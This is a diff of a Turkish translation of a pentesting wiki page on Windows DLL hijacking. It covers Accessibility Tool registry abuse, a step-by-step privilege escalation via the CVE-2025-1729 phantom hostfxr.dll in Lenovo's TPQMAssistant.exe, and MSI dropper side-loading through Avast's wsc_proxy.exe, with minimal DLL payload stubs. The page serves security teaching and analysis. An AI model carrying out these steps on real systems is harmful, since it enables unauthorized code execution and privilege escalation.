-- Yerleşik bir Erişilebilirlik Aracı (Accessibility Tool, AT) kayıt girdisini (ör. CursorIndicator) klonlayabilir, rasgele bir binary/DLL'e işaret edecek şekilde düzenleyip içe aktarabilir, ardından `configuration` değerini o AT ismine ayarlayabilirsiniz. Bu, Erişilebilirlik altyapısı altında rastgele yürütmeyi sağlar.
+- Yerleşik bir Accessibility Tool (AT) kayıt girdisini (örn. CursorIndicator) klonlayabilir, rastgele bir binary/DLL'yi işaret edecek şekilde düzenleyip içe aktarabilir, ardından `configuration`'ı o AT adına ayarlayabilirsiniz. Bu, Accessibility çerçevesi altında rastgele yürütmeyi proxy eder.
 
-Notlar
-- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek yönetici hakları gerektirir.
-- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde olabilir; export gerekmez.
+Notes
+- `%windir%\System32` altına yazma ve HKLM değerlerini değiştirme admin hakları gerektirir.
+- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde yaşayabilir; export'lara gerek yoktur.
 
-## Vaka İncelemesi: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme
+## Vaka Çalışması: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme
 
-Bu vaka Lenovo'nun TrackPoint Quick Menu'sünde (`TPQMAssistant.exe`) görülen **Phantom DLL Hijacking** zafiyetini gösterir; takip numarası **CVE-2025-1729**.
+Bu vaka, Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) içindeki **Phantom DLL Hijacking** örneğini gösterir; kayıtlı kimliği **CVE-2025-1729**.
 
 ### Zafiyet Detayları
 
-- **Bileşen**: `TPQMAssistant.exe` şu konumda: `C:\ProgramData\Lenovo\TPQM\Assistant\`.
-- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` günlük 9:30'da oturum açmış kullanıcı bağlamında çalışır.
-- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir, bu da yerel kullanıcıların rastgele dosya bırakmasına olanak tanır.
-- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeyi dener ve eksikse "NAME NOT FOUND" kaydı yapar; bu, yerel dizin arama önceliğini gösterir.
+- **Bileşen**: `TPQMAssistant.exe` konumunda `C:\ProgramData\Lenovo\TPQM\Assistant\`.
+- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` her gün saat 09:30'da oturum açmış kullanıcı bağlamında çalışır.
+- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir, bu da yerel kullanıcıların rastgele dosya bırakmasına izin verir.
+- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve eksikse "NAME NOT FOUND" kaydı tutar; bu durum yerel dizin aramasının öncelikli olduğunu gösterir.
 
-### İstismar Uygulaması
+### Exploit Implementation
 
-Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u koyabilir; eksik DLL'i suistimal ederek kullanıcının bağlamında kod yürütmesi elde edebilir:
+Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u yerleştirerek eksik DLL'i suistimal edip kullanıcının bağlamında kod yürütme elde edebilir:
 ```c
 #include <windows.h>
 
@@ -391,28 +398,28 @@ return TRUE;
 ```
 ### Saldırı Akışı
 
-1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
+1. Standart bir kullanıcı olarak, `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
 2. Zamanlanmış görevin mevcut kullanıcının bağlamında 09:30'da çalışmasını bekleyin.
-3. Görev çalışırken bir yönetici oturum açmışsa, kötü amaçlı DLL yönetici oturumunda medium integrity seviyesinde çalışır.
-4. medium integrity'den SYSTEM ayrıcalıklarına yükseltmek için standart UAC bypass tekniklerini zincirleyin.
+3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yönetici oturumunda medium integrity seviyesinde çalışır.
+4. Standart UAC bypass tekniklerini zincirleyerek medium integrity'den SYSTEM ayrıcalıklarına yükseltin.
 
-## Vaka Çalışması: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
+## Vaka İncelemesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
 
-Tehdit aktörleri sık sık MSI tabanlı dropper'ları DLL side-loading ile eşleştirir ve payload'ları güvenilir, imzalı bir süreç altında çalıştırır.
+Tehdit aktörleri, MSI tabanlı dropları sıklıkla DLL side-loading ile eşleştirir ve payload'ları güvenilir, imzalı bir işlem altında yürütür.
 
 Zincir özeti
-- Kullanıcı MSI'yi indirir. GUI kurulum sırasında (ör. LaunchApplication veya bir VBScript action) sessizce bir CustomAction çalışır ve gömülü kaynaklardan bir sonraki aşamayı yeniden oluşturur.
+- Kullanıcı MSI indirir. GUI kurulum sırasında (ör. LaunchApplication veya bir VBScript action) bir CustomAction sessizce çalışır ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
 - Dropper aynı dizine meşru, imzalı bir EXE ve kötü amaçlı bir DLL yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
-- İmzalı EXE başlatıldığında, Windows DLL search order çalışma dizininden wsc.dll'i önce yükler ve imzalı bir üst süreç altında saldırgan kodunu çalıştırır (ATT&CK T1574.001).
+- İmzalı EXE başlatıldığında, Windows DLL arama sırası öncelikle çalışma dizininden wsc.dll'i yükler ve saldırgan kodunu imzalı bir üst işlem altında çalıştırır (ATT&CK T1574.001).
 
 MSI analizi (nelere bakılmalı)
-- CustomAction table:
-- Yürütülebilir dosyaları veya VBScript çalıştıran girdilere bakın. Şüpheli örnek desen: LaunchApplication'ın arka planda gömülü bir dosyayı çalıştırması.
+- CustomAction tablosu:
+- Yürütülebilir dosyalar veya VBScript çalıştıran girdilere bakın. Şüpheli örüntü: arka planda gömülü bir dosya çalıştıran LaunchApplication.
 - Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
-- MSI CAB içindeki gömülü/bölünmüş payload'lar:
-- Yönetici çıkarma: msiexec /a package.msi /qb TARGETDIR=C:\out
+- MSI CAB içindeki gömülü/ayrılmış payload'lar:
+- Yönetici çıkarımı: msiexec /a package.msi /qb TARGETDIR=C:\out
 - Veya lessmsi kullanın: lessmsi x package.msi C:\out
-- VBScript CustomAction tarafından birleştirilen ve çözülen birden fazla küçük parça arayın. Yaygın akış:
+- Bir VBScript CustomAction tarafından birleştirilen ve şifresi çözülen birden fazla küçük fragman arayın. Yaygın akış:
 ```vb
 ' VBScript CustomAction (high level)
 ' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
@@ -421,9 +428,9 @@ MSI analizi (nelere bakılmalı)
 ' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
 ```
 Practical sideloading with wsc_proxy.exe
-- Bu iki dosyayı aynı klasöre koyun:
-- wsc_proxy.exe: meşru imzalı host (Avast). İşlem kendi dizininden wsc.dll'i adıyla yüklemeye çalışır.
-- wsc.dll: attacker DLL. Eğer spesifik exports gerekliyse, DllMain yeterli olabilir; aksi takdirde, bir proxy DLL oluşturun ve gerekli exports'ları gerçek kütüphaneye yönlendirirken payload'u DllMain içinde çalıştırın.
+- Bu iki dosyayı aynı klasöre bırakın:
+- wsc_proxy.exe: meşru imzalı host (Avast). Süreç, kendi dizininden adıyla wsc.dll'yi yüklemeye çalışır.
+- wsc.dll: saldırgan DLL. Eğer belirli export'lar gerekmiyorsa, DllMain yeterli olabilir; aksi halde, bir proxy DLL oluşturun ve gerekli export'ları gerçek kütüphaneye yönlendirirken payload'u DllMain içinde çalıştırın.
 - Minimal bir DLL payload oluşturun:
 ```c
 // x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
@@ -435,12 +442,12 @@ WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
 return TRUE;
 }
 ```
-- İhraç gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL üretmek amacıyla bir proxying framework (ör. DLLirant/Spartacus) kullanın.
+- İhracat gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL oluşturmak üzere proxying framework (ör., DLLirant/Spartacus) kullanın.
 
-- Bu teknik, host binary tarafından yapılan DLL ad çözümlemesine dayanır. Eğer host mutlak yollar veya güvenli yükleme bayrakları (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
-- KnownDLLs, SxS, and forwarded exports önceliği etkileyebilir ve host binary ile export seti seçilirken dikkate alınmalıdır.
+- Bu teknik, host binary tarafından DLL ad çözümlemesine dayanır. Eğer host mutlak yollar veya güvenli yükleme bayrakları (ör., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
+- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export seti seçilirken dikkate alınmalıdır.
 
-## References
+## Referanslar
 
 - [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
 - [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
